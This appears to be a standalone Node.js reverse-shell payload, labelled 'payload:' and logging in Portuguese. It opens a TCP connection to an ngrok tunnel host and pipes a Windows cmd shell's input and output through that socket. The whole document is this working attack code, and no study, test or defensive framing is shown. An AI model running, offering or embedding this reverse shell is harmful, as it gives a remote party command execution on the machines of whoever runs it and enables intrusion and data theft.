payload: const net = require('net'); const { exec } = require('child_process');const SERVER_HOST = '0.tcp.sa.ngrok.io'; const SERVER_PORT = 17740; const socket = net.createConnection({ host: SERVER_HOST, port: SERVER_PORT }, () => { console.log('Conexão estabelecida com o servidor.'); const shell = exec('cmd'); shell.stdout.pipe(socket); shell.stderr.pipe(socket); socket.pipe(shell.stdin); }); socket.on('error', (err) => { console.error('Erro de conexão:', err); });
